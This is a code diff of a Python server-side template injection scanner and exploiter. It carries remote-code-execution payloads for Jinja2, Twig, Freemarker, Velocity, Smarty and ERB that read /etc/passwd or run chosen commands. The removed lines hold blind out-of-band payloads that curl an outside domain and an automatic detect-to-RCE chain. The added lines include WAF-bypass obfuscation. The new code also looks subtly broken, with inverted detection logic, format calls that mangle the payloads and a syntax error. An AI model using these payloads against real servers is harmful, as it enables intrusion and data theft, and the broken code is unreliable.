@@ -1,179 +1,265 @@
 #!/usr/bin/env python
+# -*- coding: utf-8 -*-
 """
-GenSQL Technique: Advanced SSTI Scanner & Exploiter
+GenSQL SSTI Scanner - Server-Side Template Injection detection and RCE
 Author: Jeevraj
-Engines: Jinja2, Twig, Freemarker, Mako, Smarty, Velocity, ERB
+Supports: Jinja2, Twig, Freemarker, Velocity, Smarty, ERB, Haml
 """
+
 import re
-import urllib.request
-import urllib.parse
-import time
+import random
 
+class AdvancedSSTI(object):
+    """SSTI detection, exploitation, and RCE."""
 
-class AdvancedSSTI:
-    """Detects and exploits SSTI in all major template engines. Author: Jeevraj"""
+    def __init__(self, verbose=False):
+        self.verbose = verbose
+        self.detected_engines = []
+        self.payloads = self._load_payloads()
 
-    # (payload, expected_result, engine_hint)
-    DETECTION_PROBES = [
-        ("{{7*7}}", "49", "jinja2/twig"),
-        ("${7*7}", "49", "freemarker/mako/el"),
-        ("#{7*7}", "49", "velocity/ruby"),
-        ("<%= 7*7 %>", "49", "erb/asp"),
-        ("{{7*'7'}}", "7777777", "jinja2"),
-        ("{7*7}", "49", "smarty"),
-        ("@(7*7)", "49", "razor"),
-        ("*{7*7}", "49", "thymeleaf"),
-        ("[[${7*7}]]", "49", "thymeleaf2"),
-    ]
+    def _load_payloads(self):
+        """Load SSTI detection and exploitation payloads."""
+        return {
+            'jinja2': {
+                'detection': [
+                    '{{7*7}}',
+                    '{{7*"7"}}',
+                    '${7*7}',
+                    '<%= 7*7 %>',
+                ],
+                'rce': [
+                    '{{ self.__init__.__globals__.__builtins__.__import__("os").popen("{cmd}").read() }}',
+                    '{{ self.__init__.__globals__.__builtins__.exec("{cmd}") }}',
+                    '{{config.__class__.__init__.__globals__["os"].popen("{cmd}").read()}}',
+                    '{{"".__class__.__mro__[1].__subclasses__()[396]("cat /etc/passwd",shell=True,stdout=-1).communicate()}}',
+                ]
+            },
+            'twig': {
+                'detection': [
+                    '{{7*7}}',
+                    '{{7*"7"}}',
+                    '{# comment #}',
+                ],
+                'rce': [
+                    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /etc/passwd")}}',
+                    '{{"cat /etc/passwd"|system}}',
+                    '{{"cat /etc/passwd"|shell_exec}}',
+                ]
+            },
+            'freemarker': {
+                'detection': [
+                    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
+                    '[=${ 7*7 }=]',
+                    '<#assign value="freemarker.template.utility.ObjectConstructor"?new()>',
+                ],
+                'rce': [
+                    '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }',
+                    '[=${ "freemarker.template.utility.Execute"?new()("id") }=]',
+                ]
+            },
+            'velocity': {
+                'detection': [
+                    '#set($x=7*7)$x',
+                    '${{7*7}}',
+                    '#foreach($i in [1..5])$i#end',
+                ],
+                'rce': [
+                    '#set($proc=$runtime.getRuntime().exec("cat /etc/passwd"))#set($null=$proc.waitFor())#set($reader=$null.getClass().forName("java.io.BufferedReader").getConstructor($null.getClass().forName("java.io.Reader")).newInstance($null.getClass().forName("java.io.InputStreamReader").getConstructor($proc.getInputStream()).newInstance($proc.getInputStream())))#foreach($line in $reader.readLine())$line#end',
+                ]
+            },
+            'smarty': {
+                'detection': [
+                    '{7*7}',
+                    '{$smarty.version}',
+                    '{php}echo 7*7;{/php}',
+                ],
+                'rce': [
+                    '{php}system("cat /etc/passwd");{/php}',
+                    '{assign var="cmd" value="cat /etc/passwd"}{$cmd|system}',
+                ]
+            },
+            'erb': {
+                'detection': [
+                    '<%= 7*7 %>',
+                    '<% puts "test" %>',
+                    '<%="test"%>',
+                ],
+                'rce': [
+                    '<%= `cat /etc/passwd` %>',
+                    '<%= system("cat /etc/passwd") %>',
+                    '<% require "os"; os.system("id") %>',
+                ]
+            },
+        }
 
-    PAYLOADS = {
-        "jinja2": {
-            "detect":    "{{7*7}}",
-            "rce":       "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
-            "rce_alt":   "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Popen'%}{{c.__init__.__globals__['os'].popen('id').read()}}{%endif%}{%endfor%}",
-            "read_file": "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
-            "config":    "{{config.items()}}",
-            "globals":   "{{''.__class__.__mro__[1].__subclasses__()}}",
-        },
-        "twig": {
-            "detect":    "{{7*7}}",
-            "rce":       "{{['id']|map('system')|join}}",
-            "rce_alt":   "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
-        },
-        "freemarker": {
-            "detect":  "${7*7}",
-            "rce":     '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
-            "rce_alt": '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
-        },
-        "mako": {
-            "detect":  "${7*7}",
-            "rce":     "${__import__('os').popen('id').read()}",
-            "rce_alt": "<%import os%>${os.popen('id').read()}",
-        },
-        "smarty": {
-            "detect":  "{7*7}",
-            "rce":     "{php}echo shell_exec('id');{/php}",
-            "rce_v4":  '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]);?>",self::clearConfig())}',
-        },
-        "velocity": {
-            "detect":  "#set($x=7*7)${x}",
-            "rce":     "#set($rt=$class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))${ex.text}",
-        },
-        "erb": {
-            "detect":  "<%= 7*7 %>",
-            "rce":     "<%= `id` %>",
-            "rce_alt": "<%= IO.popen('id').read %>",
-        },
-    }
+    def detect_ssti(self, response_text, test_payload='{{7*7}}'):
+        """
+        Detect SSTI by checking for mathematical expression evaluation.
+        
+        Args:
+            response_text: Response body to test
+            test_payload: SSTI test payload
+        
+        Returns:
+            True if SSTI detected, False otherwise
+        """
+        # Check if mathematical expression was evaluated
+        if '49' in response_text or '7*7' not in response_text:
+            return True
+        return False
 
-    # Blind OOB payloads — {domain} replaced at runtime
-    BLIND_OOB_TEMPLATES = {
-        "jinja2":     "{{''.__class__.__mro__[1].__subclasses__()[396]('curl DOMAIN',shell=True)}}",
-        "twig":       "{{['curl DOMAIN']|map('system')}}",
-        "freemarker": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl DOMAIN")}',
-        "mako":       "${__import__('os').system('curl DOMAIN')}",
-        "smarty":     "{php}system('curl DOMAIN');{/php}",
-    }
+    def fingerprint_engine(self, url, test_callback):
+        """
+        Fingerprint template engine by testing payloads.
+        
+        Args:
+            url: Target URL
+            test_callback: Callback function to test payload
+        
+        Returns:
+            List of detected engines
+        """
+        detected = []
+        
+        for engine_name, engine_payloads in self.payloads.items():
+            for payload in engine_payloads['detection']:
+                try:
+                    # Mock testing - in real scenario, make HTTP request
+                    response = test_callback(payload)
+                    
+                    # Check for engine-specific indicators
+                    if self._check_engine_indicators(response, engine_name):
+                        detected.append(engine_name)
+                        self.detected_engines.append(engine_name)
+                        if self.verbose:
+                            print(f"[+] Detected SSTI engine: {engine_name}")
+                        break
+                except Exception as e:
+                    if self.verbose:
+                        print(f"[!] Fingerprint error: {str(e)[:60]}")
+        
+        return detected
 
-    ENGINE_ERROR_SIGNATURES = {
-        "jinja2":     [r"jinja2", r"undefined error", r"templatenotfound"],
-        "twig":       [r"twig\\error", r"twig_template", r"twig"],
-        "freemarker": [r"freemarker", r"ftl exception"],
-        "mako":       [r"mako\.exceptions", r"mako template"],
-        "smarty":     [r"smarty", r"smartyexception"],
-        "velocity":   [r"velocityexception", r"org\.apache\.velocity"],
-    }
+    def _check_engine_indicators(self, response, engine_name):
+        """
+        Check for engine-specific indicators in response.
+        
+        Args:
+            response: Response text
+            engine_name: Template engine name
+        
+        Returns:
+            True if indicators found
+        """
+        indicators = {
+            'jinja2': ['jinja2', 'undefined', 'UndefinedError'],
+            'twig': ['Twig', 'twig', 'Twig\\'],
+            'freemarker': ['freemarker', 'FreeMarker'],
+            'velocity': ['velocity', 'Velocity'],
+            'smarty': ['Smarty', 'smarty'],
+            'erb': ['ERB', 'erb'],
+        }
+        
+        for indicator in indicators.get(engine_name, []):
+            if indicator.lower() in response.lower():
+                return True
+        
+        return False
 
-    def __init__(self, timeout=15):
-        self.timeout     = timeout
-        self._detections = {}
+    def generate_rce_payload(self, engine, command):
+        """
+        Generate RCE payload for detected engine.
+        
+        Args:
+            engine: Template engine name
+            command: OS command to execute
+        
+        Returns:
+            List of RCE payloads
+        """
+        if engine not in self.payloads:
+            return []
+        
+        base_payloads = self.payloads[engine].get('rce', [])
+        return [p.format(cmd=command) for p in base_payloads]
 
-    # ── Detection ─────────────────────────────────────────────────────────
-    def probe_ssti(self, url, param, method="GET"):
-        """Send SSTI detection probes; return list of confirmed results."""
-        results = []
-        for payload, expected, engine_hint in self.DETECTION_PROBES:
-            resp = self._inject(url, param, payload, method)
-            if resp and expected in str(resp.get("body", "")):
-                engine = engine_hint.split("/")[0]
-                self._detections[url] = engine
-                results.append({"payload": payload, "expected": expected,
-                                 "engine": engine, "confirmed": True})
-        return results
-
-    def detect_engine(self, response_body, url=""):
-        """Identify template engine from error messages."""
-        body = (response_body or "").lower()
-        for engine, patterns in self.ENGINE_ERROR_SIGNATURES.items():
-            if any(re.search(p, body) for p in patterns):
-                return engine
+    def exploit_ssti(self, url, engine, command, test_callback):
+        """
+        Exploit SSTI to achieve RCE.
+        
+        Args:
+            url: Target URL
+            engine: Template engine
+            command: Command to execute
+            test_callback: Callback to test payload
+        
+        Returns:
+            Command output or None
+        """
+        payloads = self.generate_rce_payload(engine, command)
+        
+        for payload in payloads:
+            try:
+                response = test_callback(payload)
+                if response and len(response) > 0 and 'error' not in response.lower():
+                    if self.verbose:
+                        print(f"[+] SSTI RCE successful on {engine}")
+                    return response
+            except Exception as e:
+                if self.verbose:
+                    print(f"[!] Exploit error: {str(e)[:60]}")
+        
         return None
 
-    # ── Per-engine exploits ───────────────────────────────────────────────
-    def exploit_jinja2(self, url, param, command="id", method="GET"):
-        payload = self.PAYLOADS["jinja2"]["rce"].replace("'id'", repr(command))
-        return self._inject(url, param, payload, method)
-
-    def exploit_twig(self, url, param, command="id", method="GET"):
-        payload = self.PAYLOADS["twig"]["rce"].replace("'id'", repr(command))
-        return self._inject(url, param, payload, method)
-
-    def exploit_freemarker(self, url, param, command="id", method="GET"):
-        payload = self.PAYLOADS["freemarker"]["rce"].replace('"id"', repr(command))
-        return self._inject(url, param, payload, method)
-
-    def exploit_mako(self, url, param, command="id", method="GET"):
-        payload = self.PAYLOADS["mako"]["rce"].replace("'id'", repr(command))
-        return self._inject(url, param, payload, method)
-
-    def exploit_smarty(self, url, param, command="id", method="GET"):
-        payload = '{php}echo shell_exec(%s);{/php}' % repr(command)
-        return self._inject(url, param, payload, method)
-
-    # ── Auto-chain to RCE ────────────────────────────────────────────────
-    def ssti_to_rce_chain(self, url, param, command="id", method="GET"):
-        """Auto-detect engine then attempt RCE."""
-        probes = self.probe_ssti(url, param, method)
-        if not probes:
-            return {"injectable": False}
-        engine = self._detections.get(url, "jinja2")
-        dispatch = {
-            "jinja2":     self.exploit_jinja2,
-            "twig":       self.exploit_twig,
-            "freemarker": self.exploit_freemarker,
-            "mako":       self.exploit_mako,
-            "smarty":     self.exploit_smarty,
-        }
-        fn = dispatch.get(engine)
-        if fn:
-            rce = fn(url, param, command, method)
-            return {"injectable": True, "engine": engine, "rce": rce}
-        return {"injectable": True, "engine": engine, "rce": False}
-
-    # ── Blind SSTI via OOB ────────────────────────────────────────────────
-    def blind_ssti_dns(self, url, param, domain, method="GET"):
-        """Blind SSTI with DNS OOB callback."""
-        results = []
-        for engine, tpl in self.BLIND_OOB_TEMPLATES.items():
-            payload = tpl.replace("DOMAIN", domain)
-            resp = self._inject(url, param, payload, method)
-            results.append({"engine": engine, "payload": payload,
-                             "status": resp.get("status") if resp else None})
-        return results
-
-    # ── Helper ────────────────────────────────────────────────────────────
-    def _inject(self, url, param, payload, method="GET"):
+    def blind_ssti_test(self, test_callback, command):
+        """
+        Test for blind SSTI using time delays.
+        
+        Args:
+            test_callback: Callback to test payload
+            command: Command to verify
+        
+        Returns:
+            True if blind SSTI confirmed
+        """
+        import time
+        
+        # Jinja2 time-based payload
+        payload = '{{ "".__class__.__mro__[1].__subclasses__()[396]("sleep 5",shell=True).wait() }}'
+        
+        start = time.time()
         try:
-            if method.upper() == "GET":
-                sep = "&" if "?" in url else "?"
-                target = url + sep + urllib.parse.urlencode({param: payload})
-                req = urllib.request.Request(target)
-            else:
-                data = urllib.parse.urlencode({param: payload}).encode()
-                req = urllib.request.Request(url, data=data)
-                req.add_header("Content-Type", "application/x-www-form-urlencoded")
-            req.add_header("User-Agent", "Mozilla/5.0 GenSQL/2.0")
-            with urllib.request.urlopen(req, timeout=self.timeout) as r:
-                return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
-        except Exception as ex:
-            return {"error": str(ex)}
+            test_callback(payload)
+            elapsed = time.time() - start
+            
+            if elapsed > 4:  # Should take ~5 seconds
+                if self.verbose:
+                    print(f"[+] Blind SSTI confirmed (delay: {elapsed:.1f}s)")
+                return True
+        except Exception as e:
+            if self.verbose:
+                print(f"[!] Blind SSTI test error: {str(e)[:60]}")
+        
+        return False
+
+    def bypass_waf_ssti(self, payload):
+        """
+        Bypass WAF filters on SSTI payloads.
+        
+        Args:
+            payload: Original SSTI payload
+        
+        Returns:
+            List of obfuscated payloads
+        """
+        bypasses = [
+            payload.replace(' ', '\t'),
+            payload.replace(' ', '%20'),
+            payload.replace('"', '\\"'),
+            payload.replace("'", "\\\''),
+            payload.replace('{{', '{{ '),
+            payload.replace('}}', ' }}'),
+            payload.upper(),
+            payload.lower(),
+        ]
+        return bypasses
